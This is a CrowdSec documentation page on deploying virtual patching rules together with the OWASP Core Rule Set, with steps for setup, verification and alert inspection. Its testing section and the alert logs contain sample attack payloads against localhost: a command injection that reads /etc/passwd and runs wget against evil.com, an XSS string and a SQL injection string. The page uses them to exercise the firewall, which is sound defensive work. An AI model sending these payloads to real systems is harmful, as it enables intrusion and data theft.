---
id: vpatch_and_crs
title: Virtual Patching + OWASP CRS
sidebar_position: 5
---

## Overview

This guide shows how to deploy both CrowdSec's virtual patching rules and OWASP Core Rule Set (CRS) together for comprehensive web application protection.

**Prerequisites**:
- Basic AppSec setup completed (see [Getting Started guides](/appsec/quickstart/))
- CrowdSec Security Engine installed and running

## Quick Setup

### Install Required Collections

Install both the virtual patching and CRS collections:

```bash
# Install virtual patching rules (in-band blocking)
cscli collections install crowdsecurity/appsec-virtual-patching

# Install OWASP CRS rules (out-of-band detection + scenario)
cscli collections install crowdsecurity/appsec-crs
```

### Configure AppSec

Update your AppSec acquisition configuration:

```yaml title="/etc/crowdsec/acquis.d/appsec.yaml"
appsec_configs:
  - crowdsecurity/appsec-default    # Virtual patching rules (in-band)
  - crowdsecurity/crs               # OWASP CRS rules (out-of-band)
labels:
  type: appsec
listen_addr: 127.0.0.1:7422
source: appsec
```

### Restart CrowdSec

```bash
sudo systemctl restart crowdsec
```

## How It Works

### Two-Layer Protection

**Layer 1 - Virtual Patching (In-band)**:
- Rules from `crowdsecurity/appsec-default` 
- Evaluated synchronously before request proceeds
- Blocks known exploits immediately
- High-confidence, low false-positive rules

**Layer 2 - OWASP CRS (Out-of-band)**:
- Full ModSecurity Core Rule Set from `crowdsecurity/crs`
- Evaluated asynchronously after request is processed
- Comprehensive attack detection and analysis
- No impact on request response time

### CRS Out-of-Band Processing

OWASP CRS rules are loaded as out-of-band rules, which means:

1. **No Performance Impact**: CRS evaluation happens after the web server has already responded
2. **Comprehensive Detection**: Full rule set can detect complex attack patterns
3. **Event Generation**: Matches generate events for CrowdSec's scenario system
4. **Behavioral Analysis**: The `crowdsecurity/crowdsec-appsec-outofband` scenario monitors patterns and bans repeat offenders

### Scenario Integration

The `crowdsecurity/appsec-crs` collection includes:
- **crowdsecurity/crs**: AppSec config that loads CRS rules in out-of-band mode
- **crowdsecurity/crowdsec-appsec-outofband**: Scenario that bans IPs after 5+ out-of-band rule violations

## Verification

### Check Installation

Verify that both configurations are loaded:

```bash
# Check AppSec configurations
cscli appsec-configs list

# Should show:
# crowdsecurity/appsec-default
# crowdsecurity/crs

# Check scenarios
cscli scenarios list | grep appsec

# Should show:
# crowdsecurity/crowdsec-appsec-outofband
```

### Check AppSec Status

```bash
# Check that AppSec is running
cscli metrics

# Look for appsec metrics in the output
```

## Testing - CrowdSec Vpatch

If CrowdSec vpatch rules are properly enabled, the following request should return a 403:

```bash
TARGET=localhost
curl -I ${TARGET}'/.env'
```


## Testing - OWASP CRS

```bash
TARGET=localhost
curl -I  ${TARGET}'/?x=A";cat+/etc/passwd;wget+http://evil.com/payload'
curl -I  ${TARGET}'/?x=A";cat+/etc/passwd;wget+http://evil.com/payload'
curl -I  ${TARGET}'/?x=A"<script>alert(1)</script>'
curl -I  ${TARGET}'/?x=A"<script>alert(1)</script>'
curl -I  ${TARGET}'/?x=A"+OR+"1"="1"+union+select+"fooobar","foo'
curl -I  ${TARGET}'/?x=A"+OR+"1"="1"+union+select+"fooobar","foo'
```

:::warning
Those requests are meant to emulate malevolent requests that will be catched by OWASP CRS.
:::

Uppon triggering those, you should see in CrowdSec logs:

```bash
time="2025-08-22T11:39:50+02:00" level=info msg="Ip xxx performed 'crowdsecurity/crowdsec-appsec-outofband' (6 events over 65.915093ms) at 2025-08-22 09:39:50.392681747 +0000 UTC"
time="2025-08-22T11:39:51+02:00" level=info msg="(5cf8aff523424fa68e9335f28fec409aIfHabI3W9GsKHzab/crowdsec) crowdsecurity/crowdsec-appsec-outofband by ip xxx : 4h ban on Ip xxx"
```

Further requests to the webserver should return 403:

```bash
$ curl -I ${TARGET}
HTTP/1.1 403 Forbidden
```

## Alert Inspection

You can inspect the alert to better see what URLs or payloads triggered the rules:

```bash
# cscli  alerts list
╭──────┬────────────┬─────────────────────────────────────────┬─────────┬────┬───────────┬──────────────────────╮
│  ID  │    value   │                  reason                 │ country │ as │ decisions │      created_at      │
├──────┼────────────┼─────────────────────────────────────────┼─────────┼────┼───────────┼──────────────────────┤
│ 2172 │ Ip:xxx     │ crowdsecurity/crowdsec-appsec-outofband │         │    │ ban:1     │ 2025-08-22T09:39:50Z │
...
```

```bash
# cscli  alerts inspect -d 2172

################################################################################################

 - ID           : 2172
 - Date         : 2025-08-22T09:39:51Z
 - Machine      : 5cf8aff523424fa68e9335f28fec409aIfHabI3W9GsKHzab
 - Simulation   : false
 - Remediation  : true
 - Reason       : crowdsecurity/crowdsec-appsec-outofband
 - Events Count : 6
 - Scope:Value  : Ip:xxx
 - Country      : 
 - AS           : 
 - Begin        : 2025-08-22T09:39:50Z
 - End          : 2025-08-22T09:39:50Z
 - UUID         : a0ad365a-ef08-4c18-af80-20cc02625c35

╭─────────────────────────────────────────────────────────────────────╮
│ Active Decisions                                                    │
├──────────┬─────────────┬────────┬────────────┬──────────────────────┤
│    ID    │ scope:value │ action │ expiration │      created_at      │
├──────────┼─────────────┼────────┼────────────┼──────────────────────┤
│ 19719904 │ Ip:xxx      │ ban    │ 3h57m38s   │ 2025-08-22T09:39:51Z │
╰──────────┴─────────────┴────────┴────────────┴──────────────────────╯

 - Context  :
╭────────────┬─────────────────────────────────────────────────────╮
│     Key    │                        Value                        │
├────────────┼─────────────────────────────────────────────────────┤
│ rules      │ native_rule:901340                                  │
│ target_uri │ /?x=A";cat+/etc/passwd;wget+http://evil.com/payload │
│ target_uri │ /?x=A"<script>alert(1)</script>                     │
│ target_uri │ /?x=A"+OR+"1"="1"+union+select+"fooobar","foo       │
╰────────────┴─────────────────────────────────────────────────────╯

 - Events  :

- Date: 2025-08-22 09:39:50.326505724 +0000 UTC
╭─────────────────────┬──────────────────────────────────────────────────────────────╮
│         Key         │                             Value                            │
├─────────────────────┼──────────────────────────────────────────────────────────────┤
│ datasource_path     │ appsec                                                       │
│ datasource_type     │ appsec                                                       │
│ log_type            │ appsec-info                                                  │
│ remediation_cmpt_ip │ 127.0.0.1                                                    │
│ request_uuid        │ 331f9426-3333-420a-bffa-ab953f44e329                         │
│ rule_ids            │ [901340 930120 932230 932235 932115 932160 942540 949110     │
│                     │ 980170]                                                      │
│ rule_name           │ native_rule:901340                                           │
│ service             │ appsec                                                       │
│ source_ip           │ xxx                                                          │
│ target_host         │ localhost                                                    │
│ target_uri          │ /?x=A";cat+/etc/passwd;wget+http://evil.com/payload          │
╰─────────────────────┴──────────────────────────────────────────────────────────────╯

- Date: 2025-08-22 09:39:50.33919196 +0000 UTC
╭─────────────────────┬──────────────────────────────────────────────────────────────╮
│         Key         │                             Value                            │
├─────────────────────┼──────────────────────────────────────────────────────────────┤
│ datasource_path     │ appsec                                                       │
│ datasource_type     │ appsec                                                       │
│ log_type            │ appsec-info                                                  │
│ remediation_cmpt_ip │ 127.0.0.1                                                    │
│ request_uuid        │ 69c72a65-e7e5-49fa-9253-bdbe6fca52c9                         │
│ rule_ids            │ [901340 930120 932230 932235 932115 932160 942540 949110     │
│                     │ 980170]                                                      │
│ rule_name           │ native_rule:901340                                           │
│ service             │ appsec                                                       │
│ source_ip           │ xxx                                                          │
│ target_host         │ localhost                                                    │
│ target_uri          │ /?x=A";cat+/etc/passwd;wget+http://evil.com/payload          │
╰─────────────────────┴──────────────────────────────────────────────────────────────╯

- Date: 2025-08-22 09:39:50.352001523 +0000 UTC
╭─────────────────────┬───────────────────────────────────────────────────────────╮
│         Key         │                           Value                           │
├─────────────────────┼───────────────────────────────────────────────────────────┤
│ datasource_path     │ appsec                                                    │
│ datasource_type     │ appsec                                                    │
│ log_type            │ appsec-info                                               │
│ remediation_cmpt_ip │ 127.0.0.1                                                 │
│ request_uuid        │ b7a95a56-a88e-4c89-b23b-2d3d06759af4                      │
│ rule_ids            │ [901340 941100 941110 941160 941390 942100 949110 980170] │
│ rule_name           │ native_rule:901340                                        │
│ service             │ appsec                                                    │
│ source_ip           │ xxx                                                       │
│ target_host         │ localhost                                                 │
│ target_uri          │ /?x=A"<script>alert(1)</script>                           │
╰─────────────────────┴───────────────────────────────────────────────────────────╯

- Date: 2025-08-22 09:39:50.365872595 +0000 UTC
╭─────────────────────┬───────────────────────────────────────────────────────────╮
│         Key         │                           Value                           │
├─────────────────────┼───────────────────────────────────────────────────────────┤
│ datasource_path     │ appsec                                                    │
│ datasource_type     │ appsec                                                    │
│ log_type            │ appsec-info                                               │
│ remediation_cmpt_ip │ 127.0.0.1                                                 │
│ request_uuid        │ fbc41250-53e6-49d9-ab04-5f6ed2cc1793                      │
│ rule_ids            │ [901340 941100 941110 941160 941390 942100 949110 980170] │
│ rule_name           │ native_rule:901340                                        │
│ service             │ appsec                                                    │
│ source_ip           │ xxx                                                       │
│ target_host         │ localhost                                                 │
│ target_uri          │ /?x=A"<script>alert(1)</script>                           │
╰─────────────────────┴───────────────────────────────────────────────────────────╯

- Date: 2025-08-22 09:39:50.378905387 +0000 UTC
╭─────────────────────┬───────────────────────────────────────────────╮
│         Key         │                     Value                     │
├─────────────────────┼───────────────────────────────────────────────┤
│ datasource_path     │ appsec                                        │
│ datasource_type     │ appsec                                        │
│ log_type            │ appsec-info                                   │
│ remediation_cmpt_ip │ 127.0.0.1                                     │
│ request_uuid        │ d59825ff-268b-42ff-8e90-9e831a7f6a6b          │
│ rule_ids            │ [901340 942100 942190 949110 980170]          │
│ rule_name           │ native_rule:901340                            │
│ service             │ appsec                                        │
│ source_ip           │ xxx                                           │
│ target_host         │ localhost                                     │
│ target_uri          │ /?x=A"+OR+"1"="1"+union+select+"fooobar","foo │
╰─────────────────────┴───────────────────────────────────────────────╯

- Date: 2025-08-22 09:39:50.392514386 +0000 UTC
╭─────────────────────┬───────────────────────────────────────────────╮
│         Key         │                     Value                     │
├─────────────────────┼───────────────────────────────────────────────┤
│ datasource_path     │ appsec                                        │
│ datasource_type     │ appsec                                        │
│ log_type            │ appsec-info                                   │
│ remediation_cmpt_ip │ 127.0.0.1                                     │
│ request_uuid        │ d0dc6cab-0ef2-4e7d-9fd1-ab06091b23ea          │
│ rule_ids            │ [901340 942100 942190 949110 980170]          │
│ rule_name           │ native_rule:901340                            │
│ service             │ appsec                                        │
│ source_ip           │ xxx                                           │
│ target_host         │ localhost                                     │
│ target_uri          │ /?x=A"+OR+"1"="1"+union+select+"fooobar","foo │
╰─────────────────────┴───────────────────────────────────────────────╯

```

## Next Steps

- Learn about [AppSec Configuration options](/appsec/configuration.md)
- Understand [AppSec Hooks](/appsec/hooks.md) for customization
- Explore [Rule Syntax](/appsec/rules_syntax.md) for custom rules